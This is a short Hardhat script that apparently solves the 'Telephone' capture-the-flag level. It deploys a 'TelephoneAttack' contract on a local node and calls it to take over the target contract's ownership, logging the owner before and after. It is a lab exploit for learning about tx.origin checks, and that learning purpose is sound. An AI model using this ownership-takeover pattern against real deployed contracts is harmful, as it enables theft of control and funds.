import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x61c36a8d610163660E21a8b7359e1Cac0C9133e1";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("Telephone",CONTRACT_ADDRESS,signer);

const attackerContractFactory = await ethers.getContractFactory("TelephoneAttack", signer);
const attackerContract = await attackerContractFactory.deploy(CONTRACT_ADDRESS);

//HACK STEPS

// 1. Check contract current owner
let owner = await contract.owner();
console.log("Current owner address is: ", owner);

// 2. Call changeOwner() function from attacker contract, sending the player address to become owner.
// and check owner.
await attackerContract.attack();
owner = await contract.owner();
console.log("Current owner address is now: ", owner);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
